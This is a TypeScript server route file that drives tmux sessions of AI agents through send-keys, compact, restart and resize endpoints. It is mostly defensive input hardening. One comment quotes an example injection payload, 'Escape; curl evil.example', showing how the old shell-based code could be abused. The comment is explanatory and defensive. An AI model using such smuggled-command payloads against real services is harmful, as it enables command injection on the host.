import { Hono } from "hono";
import { execFile } from "node:child_process";
import { promisify } from "node:util";
import { execAsync, resolveTargetSession, sendToTmux, tmuxSessionExists, TMUX_SESSION } from "../utils.js";
import { getTracer } from "../../lib/otel.js";
import { SpanStatusCode } from "@opentelemetry/api";

const execFileAsync = promisify(execFile);

const TMUX_TIMEOUT_MS = 5_000;
// cw-launch creates the session and then execs cw-boot-confirm, which waits on
// the fresh agent's boot dialog — slower than a plain tmux call.
const LAUNCHER_TIMEOUT_MS = 30_000;

// The canonical orchestrator launcher (attach-or-start). CPC must never
// reconstruct the claude command itself: the previous hardcoded copy silently
// drifted from cw-launch (wrong cwd, retired channel plugin, no WOS_* env) and
// shipped restarts into a stale session for weeks (WORLD-415). Absolute by
// default because the systemd unit's PATH does not include claudes-world/bin.
//
// Scope, precisely: this launcher is authoritative for the COLD-START branch
// only. The respawn branch replays the pane's creation-time command, so an
// edit to cw-launch does not reach a session that is already running — only a
// full kill picks it up. That is still strictly better than the old code,
// which rebuilt a known-stale command every time.
const CW_LAUNCH = process.env.CW_LAUNCH_BIN || "/home/claude/claudes-world/bin/cw-launch";

const tmuxTracer = getTracer('cpc-server-tmux');

/**
 * Resolve the orchestrator's pane to an explicit `session:window.pane` target.
 * `respawn-pane` rejects a bare session name, so a concrete target is required.
 *
 * The pane we want is the one cw-launch created: the session's FIRST window,
 * first pane. Do NOT use the *active* pane — `list-panes -t "=<session>"`
 * without `-s` treats the target as a WINDOW and returns whichever window is
 * currently selected. If anyone has a second window open in this session (an
 * SSH tab, a split) and left it selected, that resolves to their pane, and
 * `respawn-pane -k` would kill THEIR process while reporting success and
 * leaving the orchestrator untouched. `-s` lists the whole session instead;
 * sort by (window, pane) so the result never depends on what a human last
 * clicked, nor on base-index / pane-base-index.
 */
async function orchestratorPaneTarget(session: string): Promise<string> {
  const { stdout } = await execFileAsync(
    "tmux",
    [
      "list-panes",
      "-s",
      "-t", `=${session}`,
      "-F", "#{window_index} #{pane_index} #{session_name}:#{window_index}.#{pane_index}",
    ],
    { timeout: TMUX_TIMEOUT_MS },
  );
  const panes = stdout
    .split("\n")
    .map((line) => line.trim())
    .filter(Boolean)
    .map((line) => {
      const [windowIndex, paneIndex, target] = line.split(" ");
      return { windowIndex: Number(windowIndex), paneIndex: Number(paneIndex), target };
    })
    .filter((p) => Number.isFinite(p.windowIndex) && Number.isFinite(p.paneIndex) && p.target);
  if (panes.length === 0) throw new Error(`no panes in tmux session ${session}`);
  panes.sort((a, b) => a.windowIndex - b.windowIndex || a.paneIndex - b.paneIndex);
  return panes[0]!.target!;
}

async function tracedTmux<T>(
  spanName: string,
  session: string,
  commandType: string,
  fn: () => Promise<T>
): Promise<T> {
  const span = tmuxTracer.startSpan(spanName, {
    attributes: { 'tmux.session': session, 'tmux.command_type': commandType },
  });
  try {
    return await fn();
  } catch (err) {
    span.recordException(err instanceof Error ? err : String(err));
    span.setStatus({ code: SpanStatusCode.ERROR });
    throw err;
  } finally {
    span.end();
  }
}

const app = new Hono();

/**
 * Allowlist regex for raw tmux key tokens. A raw `send-keys` call accepts
 * things like `Escape`, `BTab`, `Up`, `Down`, `C-a`, `M-Left`, `S-F1` — all
 * of which fit `^[A-Za-z][A-Za-z0-9_-]*$`. Anything else (shell metachars,
 * whitespace other than the single-space token separator, semicolons, backticks,
 * subshells, etc.) is rejected with 400.
 *
 * Space-separated multi-key strings are allowed (tmux supports
 * `send-keys Escape Up Up`) but each token must independently match. The split
 * happens on `\s+` so the shell can never see a metachar.
 *
 * Security rationale: the previous implementation wired `body.keys` directly
 * into `tmux send-keys -t <session> <keys>` via `exec()`, which spawns
 * `/bin/sh -c` and interprets the whole string as a shell command. A POST
 * containing `{"raw":true,"keys":"Escape; curl evil.example"}` would execute
 * the curl as the `claude` user. The new implementation routes through
 * `execFile` with an argv array (no shell) AND enforces the token allowlist
 * so even a future regression in execFile cannot leak shell metacharacters to
 * tmux's own key parser.
 */
const RAW_KEY_TOKEN = /^[A-Za-z][A-Za-z0-9_-]*$/;

/**
 * Resolve the optional `session` body field shared by the restricted
 * command palette endpoints (send-keys / compact / reload-plugins — the
 * fixed verb set Liam wants usable against ANY fleet session, voice msg
 * 1188). Returns the validated target session name, or a Response already
 * sent to the client (400 bad name / 404 unknown session).
 *
 * The default session skips the existence probe on purpose — legacy
 * behavior lets commands race a /restart-session recreate, and tmux's own
 * error still surfaces as a 500 if it's truly gone. A client-picked
 * session, by contrast, must exist before we send keys anywhere near it.
 *
 * NOT wired into /restart-session or /resize-terminal: those stay
 * default-session-only by design (restart respawns the orchestrator's own
 * pane, and falls back to the orchestrator-specific cw-launch; resize has
 * the window-size latch side effect) — the palette never offers them for
 * other sessions, and the UI hides them while a non-default session is
 * being viewed (ActionBar.tsx, `restrictedSession`).
 */
async function resolvePaletteTarget(c: any, body: any): Promise<{ session: string } | { response: Response }> {
  const target = resolveTargetSession(body?.session);
  if (!target.ok) {
    return { response: c.json({ ok: false, error: target.error }, 400) };
  }
  if (target.session !== TMUX_SESSION && !(await tmuxSessionExists(target.session))) {
    return { response: c.json({ ok: false, error: "unknown session" }, 404) };
  }
  return { session: target.session };
}

// Control chars (C0 + DEL) in a literal `send-keys` payload act as submit /
// command separators in the target terminal — a single newline turns one
// "verb" into two submitted lines. For a NON-default (restricted) session —
// one reached through the restricted palette, which DOES allow gated
// single-line free text (Option A, Liam msg 1607) — that would let a
// compaction message or key string smuggle EXTRA commands past the one the
// user actually submitted, so literal payloads to non-default sessions must
// be single-line. This bounds each action to one line; it is not a view-only
// restriction. The default session (Liam's own, writable) intentionally
// keeps multi-line steering — e.g. the "/fork\n/rename" flow relies on an
// embedded newline.
const LITERAL_CONTROL_CHAR_RE = /[\x00-\x1f\x7f]/;

/** True when a literal payload must be rejected for the given target: a
 *  non-default session may only receive single-line, control-char-free text. */
function isDisallowedNonDefaultLiteral(session: string, payload: string): boolean {
  return session !== TMUX_SESSION && LITERAL_CONTROL_CHAR_RE.test(payload);
}

app.post("/send-keys", async (c) => {
  try {
    const body = await c.req.json();
    const keys = body.keys;
    if (!keys || typeof keys !== "string") {
      return c.json({ ok: false, error: "keys required" }, 400);
    }
    const resolved = await resolvePaletteTarget(c, body);
    if ("response" in resolved) return resolved.response;
    const session = resolved.session;
    if (body.raw) {
      // Split on whitespace and validate each token against the allowlist.
      // Reject empty-after-split (e.g. all whitespace input) so we never call
      // tmux with zero key args.
      const tokens = keys.split(/\s+/).filter(Boolean);
      if (tokens.length === 0) {
        return c.json({ ok: false, error: "keys required" }, 400);
      }
      for (const tok of tokens) {
        if (!RAW_KEY_TOKEN.test(tok)) {
          return c.json(
            { ok: false, error: `invalid raw key token: ${tok}` },
            400,
          );
        }
      }
      // execFile with argv — no shell, no interpolation. `=` prefix:
      // exact-match session lookup (the target can be client-picked).
      await tracedTmux('tmux.send-keys', session, 'raw', () =>
        execFileAsync("tmux", ["send-keys", "-t", `=${session}:`, ...tokens])
      );
    } else {
      // A non-default (restricted) session must not receive a multi-line
      // literal payload: an embedded newline submits an extra command line
      // beyond the single line the user meant (PR #306 R3). Free single-line
      // text IS allowed (Option A); execFile already blocks shell injection;
      // this blocks command *chaining* at the tmux layer.
      if (isDisallowedNonDefaultLiteral(session, keys)) {
        return c.json({ ok: false, error: "non-default sessions accept single-line keys only" }, 400);
      }
      // Literal text — use execFile (no shell) with `-l` and `--` so user
      // input cannot inject via $(...) or backticks. The previous execAsync
      // path spawned /bin/sh -c on an interpolated string; JSON.stringify
      // only quotes for JS, NOT for shells, so `$(...)` and backticks in the
      // keys survived the quote and were executed by sh BEFORE tmux saw them.
      await tracedTmux('tmux.send-keys', session, 'literal', async () => {
        await execFileAsync("tmux", ["send-keys", "-t", `=${session}:`, "-l", "--", keys]);
        await execFileAsync("tmux", ["send-keys", "-t", `=${session}:`, "Enter"]);
      });
    }
    return c.json({ ok: true, action: "send-keys" });
  } catch (err: any) {
    return c.json({ ok: false, error: err.message }, 500);
  }
});

app.post("/compact", async (c) => {
  try {
    const body = await c.req.json();
    const message = body.message as string;
    if (!message) return c.json({ ok: false, error: "message required" }, 400);
    const resolved = await resolvePaletteTarget(c, body);
    if ("response" in resolved) return resolved.response;
    const session = resolved.session;

    // A non-default (restricted) session must not receive a multi-line
    // compaction message: an embedded newline submits an extra command line
    // beyond the one the user meant (PR #306 R3, superseding the bypassable
    // "/compact"-prefix check — `\s` matched `\n`). The single-line message
    // itself is intentionally free text (Option A, Liam msg 1607), bounded by
    // Telegram auth; the durable confirm-gated steering design is #241 phase-2.
    if (isDisallowedNonDefaultLiteral(session, message)) {
      return c.json({ ok: false, error: "non-default sessions accept single-line messages only" }, 400);
    }

    // Send via tmux send-keys — execFile (no shell) with -l + -- so the
    // user-provided message cannot inject via $(...) or backticks.
    await tracedTmux('tmux.compact', session, 'compact', async () => {
      await execFileAsync("tmux", ["send-keys", "-t", `=${session}:`, "-l", "--", message]);
      await execFileAsync("tmux", ["send-keys", "-t", `=${session}:`, "Enter"]);
    });
    return c.json({ ok: true, action: "compact" });
  } catch (err: any) {
    return c.json({ ok: false, error: err.message }, 500);
  }
});

app.post("/reload-plugins", async (c) => {
  try {
    // Body is optional here (legacy clients POST with no body at all).
    const body = await c.req.json().catch(() => ({}));
    const resolved = await resolvePaletteTarget(c, body);
    if ("response" in resolved) return resolved.response;
    const session = resolved.session;
    await tracedTmux('tmux.send-keys', session, 'reload-plugins', () =>
      sendToTmux("/reload-plugins", session)
    );
    return c.json({ ok: true, action: "reload-plugins" });
  } catch (err: any) {
    return c.json({ ok: false, error: err.message }, 500);
  }
});

app.post("/restart-session", async (c) => {
  try {
    await tracedTmux('tmux.restart-session', TMUX_SESSION, 'restart-session', async () => {
      if (await tmuxSessionExists(TMUX_SESSION)) {
        await execFileAsync("tmux", ["respawn-pane", "-k", "-t", await orchestratorPaneTarget(TMUX_SESSION)], {
          timeout: TMUX_TIMEOUT_MS,
        });
        return;
      }
      await execFileAsync(CW_LAUNCH, [], { timeout: LAUNCHER_TIMEOUT_MS });
    });
    return c.json({ ok: true, action: "restart-session" });
  } catch (err: any) {
    return c.json({ ok: false, error: err.message }, 500);
  }
});

app.post("/resize-terminal", async (c) => {
  try {
    await tracedTmux('tmux.resize-terminal', TMUX_SESSION, 'resize-terminal', () =>
      execAsync(`tmux resize-window -t ${TMUX_SESSION} -A`)
    );
    return c.json({ ok: true, action: "resize-terminal" });
  } catch (err: any) {
    return c.json({ ok: false, error: err.message }, 500);
  }
});

export { app as slashCommandsRoute };
